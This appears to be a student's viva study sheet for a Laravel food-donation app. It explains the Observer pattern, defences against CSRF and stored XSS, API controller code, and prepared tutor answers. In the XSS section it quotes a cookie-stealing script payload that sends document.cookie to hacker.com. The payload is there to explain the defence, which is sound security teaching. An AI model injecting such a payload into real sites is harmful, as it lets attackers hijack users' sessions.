🎯 Design Pattern: Observer Pattern (GoF Behavioural)
🗣️ Look Tutor in the Eye & Say (Clear & Direct):
"The Observer Pattern is a design pattern where one main subject automatically notifies multiple listening observers whenever its data or state changes, without needing to know who they are."

Why we use it in Module 1: Publishing surplus food requires multiple side-effects: saving audit logs, sending push emails to nearby NGOs, and clearing search caches. If we put all that code inside DonationController@store, the controller becomes bloated and violates the Single Responsibility Principle. With Observer, Laravel listens to the Donation model directly, so notifications work consistently whether food is published from the web UI, imported via Artisan commands, or seeded in tests.

🛡️ Software Security Defense (Real Threats — NO Basic Validation)
NOT BASIC INPUT VALIDATION

Threat 1: Cross-Site Request Forgery (CSRF — OWASP A05)

The Attack: A hacker creates an external website with a hidden form pointing to http://127.0.0.1:8000/donations. If a logged-in donor visits that page, their browser automatically sends our session cookie and silently creates spam food listings.
Why validation fails: Form validation only checks if title and quantity are strings or numbers. Since the hacker's hidden form sends valid text, validation passes 100%! It cannot verify where the request originated.
NutriShare Defense: Synchronizer Token Pattern (resources/views/donations/create.blade.php Line 18). We put @csrf inside the form. Laravel creates a secret random 256-bit token tied to the user's session. Laravel's VerifyCsrfToken middleware rejects any request without this token with HTTP 419 Page Expired.

    <input type="text" name="title" required>
</form>
NOT BASIC INPUT VALIDATION

Threat 2: Stored Cross-Site Scripting (Stored XSS — OWASP A07)

The Attack: An attacker types <script>fetch('http://hacker.com?c='+document.cookie)</script> into the food description. When admins or NGOs view the food list, that script executes and steals their cookies.
Why validation fails: We cannot simply reject all < or > characters because legitimate donors write normal text like <Fresh Bread> or Quantity < 50. Validation should not corrupt valid data.
NutriShare Defense: Context-Aware HTML Escaping (resources/views/donations/show.blade.php Line 51). We render using Blade's {{ $donation->description }}. Laravel automatically runs htmlspecialchars(..., ENT_QUOTES, 'UTF-8'), turning <script> into safe &lt;script&gt; so the browser prints it as plain text.

Returns active, unclaimed food listings in IFA format. Target consumers: Module 3 (Claims), Module 4 (Inventory), and External NGO Apps.

Request: requestID (string), timestamp (ISO-8601 string), optional category_id

Response: status ('S' for success, 'E' for error), data.donations (array of food items), data.total (count)

// app/Http/Controllers/Api/DonationApiController.php (Lines 43-80)
public function active(Request $request): JsonResponse {
    try {
        // Point at Line 47: Validates IFA request format
        $ifa = SecurityHelper::validateIfaRequest($request->all());

        // Point at Lines 49-52: Active Scope (available and not expired)
        $donations = Donation::with(['donor:id,name,organization_name', 'foodItems'])
            ->active()
            ->orderBy('created_at', 'desc')
            ->get();

        // Point at Lines 72-78: Standard IFA Success envelope
        return response()->json(SecurityHelper::ifaResponse('S', [
            'requestID' => $ifa['requestID'],
            'donations' => $donations,
            'total'     => $donations->count(),
        ]), 200);
    } catch (\Exception $e) {
        return response()->json(SecurityHelper::ifaResponse('E', null, 'Failed to fetch.'), 500);
    }
}
CONSUME (WE CALL MODULE 2) POST /api/user/verify-ngo

Before letting an NGO claim food, Module 1 calls Cheon's Module 2 to verify their ROS license and approval status. Fails closed (blocks claim) if service is down.

// app/Http/Controllers/Api/DonationApiController.php (Lines 98-115)
public function verifyNgoBeforeClaim(int $ngoUserId): bool {
    try {
        // Point at Lines 102-109: Consumes Cheon's Module 2 endpoint
        $response = Http::timeout(5)->post(config('app.url').'/api/user/verify-ngo', [
            'requestID' => uniqid('VERIFY-'),
            'timestamp' => now()->toIso8601String(),
            'user_id'   => $ngoUserId,
        ]);

        if ($response->successful() && $response->json('status') === 'S') {
            return (bool) ($response->json('data.is_verified') ?? false);
        }
        return false; // Fail-closed on error
    } catch (\Exception $e) {
        \Log::error("Web service failure in verifyNgoBeforeClaim: {$e->getMessage()}");
        return false; // Fail-closed: block food claim if verification is unreachable
    }
}
❓ Tough Tutor Questions (Easy to Understand Answers):
Q1: Why not just put the email dispatch code inside DonationController@store?
Answer: "If we put it in the controller, it only works when a user clicks the web form. If we import donations from a mobile app API, database seeders, or console commands, the email will never trigger because the controller is bypassed. The Observer hooks into the Eloquent database model lifecycle directly, so notifications work everywhere."
Q2: What happens if the Mail server is offline or lagging when food is published? Does it crash?
Answer: "No! The Observer dispatches SendDonationNotificationJob to Laravel's asynchronous background queue. The database transaction commits immediately, and the donor sees the success page right away without waiting. The background queue worker handles retries independently."
Q3: How does the Observer Pattern differ from the Publish-Subscribe pattern?
Answer: "In classic Observer, the subject knows its observers directly. In Pub-Sub, there is an independent message broker (like Redis or Kafka) in the middle. In Laravel, Eloquent models act as subjects, and Laravel's event dispatcher manages the observer list."
Q4: Can an attacker bypass CSRF by sending an AJAX request?
Answer: "No. The Same-Origin Policy stops external malicious sites from reading or attaching our custom X-CSRF-TOKEN header. Laravel's middleware checks both the form token and header, so unauthorized cross-origin requests are blocked."
